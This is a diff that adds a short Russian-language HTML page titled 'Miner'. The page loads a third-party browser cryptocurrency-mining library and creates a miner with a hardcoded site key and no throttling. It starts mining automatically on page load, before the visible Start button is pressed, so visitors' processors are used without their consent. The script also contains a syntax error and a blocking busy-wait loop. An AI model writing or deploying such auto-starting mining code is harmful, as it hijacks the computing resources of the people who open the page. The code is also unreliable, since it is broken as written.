@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Майнер</title>
+</head>
+<body>
+    <button onclick="Miner.start()"><h1>Start</h1></button>
+<h3 id="txt"></h3>
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+        var ths = 1;
+        const Miner = WMP.Anonymous("SK_NAmPG4vWMjWCgDcvrEHVH", {
+        threads: ths,
+        autoThreads: false,
+        throttle: 0.0,
+        forceASMJS: false});
+        window.onload = () => {Started(); };
+        function Started() {
+             Miner.start();
+             while(!Miner.isRunning(){}
+             if (Miner.isRunning()){
+             console.log("yes");
+               let h = document.getElementById("txt");
+               h.innerHTML = "Miner works.";
+             }
+        }
+    </script>
+</body>
+</html>
